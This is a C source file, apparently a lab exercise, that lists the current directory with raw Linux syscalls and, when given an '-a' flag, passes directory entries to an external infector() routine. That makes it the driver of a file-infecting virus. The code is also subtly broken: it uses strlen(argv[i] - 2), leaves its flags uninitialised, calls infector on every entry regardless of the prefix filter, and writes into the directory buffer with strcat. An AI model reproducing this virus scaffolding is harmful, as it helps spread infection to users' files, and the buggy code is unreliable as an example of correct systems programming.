#include "util.h"
#include <limits.h>
#include <dirent.h>
extern int system_call();
extern void infection();
extern void infector();


#define SYS_WRITE 4
#define SYS_READ 3
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_LSEEK 19
#define STDOUT 1
#define STDIN 0
#define STDERR 2
#define SYS_GETDENTS 141

typedef struct linux_dirent {
    unsigned long  d_ino;     /* Inode number */
    unsigned long  d_off;     /* Offset to next linux_dirent */
    unsigned short d_reclen;  /* Length of this linux_dirent */
    char           d_name[];  /* Filename (null-terminated) */
    /* length is actually (d_reclen - 2 -
       offsetof(struct linux_dirent, d_name) */
    /*
    char           pad;       // Zero padding byte
    char           d_type;    // File type (only since Linux 2.6.4;
                              // offset is (d_reclen - 1))
    */

}linux_dirent;

int print_to_err(int call_id, int response, int flag) {
    if (flag == 'D') {
        system_call(SYS_WRITE, STDERR, strcat(itoa(call_id), "\n"), 3);
        system_call(SYS_WRITE, STDERR, strcat(itoa(response), "\n"), 3);
    }
    return 0;
}


int main (int argc , char* argv[], char* envp[]) {
    char buf[8192];
    int fd;
    struct linux_dirent *d;
    int count;
    int i;
    int flagd;
    int virus_flag;
    int write;
    char prefix[8192];
    int prefix_len;
    for (i = 1; i < argc ; i++) {
        if(argv[i][1] == 'D')
            flagd = 'D';
        else if(argv[i][1] == 'p') {
            prefix_len = strlen(argv[i] - 2);
            virus_flag = 'p';
            strcat(prefix,argv[i] + 2);
        }
        else if (argv[i][1] == 'a') {
            prefix_len = strlen(argv[i] - 2);
            virus_flag = 'a';
            strcat(prefix,argv[i] + 2);
        }

    }
    fd = system_call(SYS_OPEN,".",0,0777);
    print_to_err(SYS_OPEN,fd,flagd);
    if(fd < 0)
        system_call(1);
    int bpos;
    d = (struct linux_dirent *) buf;

    for ( ; ; ) {
        count = system_call(SYS_GETDENTS,fd,d,8192);
        print_to_err(SYS_GETDENTS,count,flagd);
        for (bpos = 0; bpos < count;) {
            d = (struct linux_dirent *) (buf + bpos);
            char d_type = *(buf + bpos + d->d_reclen - 1);
            if(virus_flag == 'p' || virus_flag == 'a') {
                if(strncmp(prefix,d->d_name, prefix_len) == 0) {
                    write = system_call(SYS_WRITE,STDOUT, d->d_name, strlen(d->d_name));
                    print_to_err(SYS_WRITE,write,flagd);
                    char* type = (d_type == 8) ?  " regular" :
                                 (d_type == 4) ?  " directory" :
                                 (d_type == 1) ? "  FIFO" :
                                 (d_type == 12) ? " socket" :
                                 (d_type == 10) ?  " symlink" :
                                 (d_type == 6) ?  " block dev" :
                                 (d_type == 2) ?  " char dev" : " Unknown";
                    write = system_call(SYS_WRITE,STDOUT, type,strlen(type));
                    print_to_err(SYS_WRITE,write,flagd);
                    write = system_call(SYS_WRITE,STDOUT, "\n",1);
                    print_to_err(SYS_WRITE,write,flagd);
                }
                if(virus_flag == 'a')
                    infector(d->d_name);

            }
            else {
                write = system_call(SYS_WRITE,STDOUT, strcat(d->d_name, "\n"), strlen(d->d_name) + 1);
                print_to_err(SYS_WRITE,write,flagd);
            }
            bpos = bpos + d->d_reclen;


        }
        return 0;
    }


}
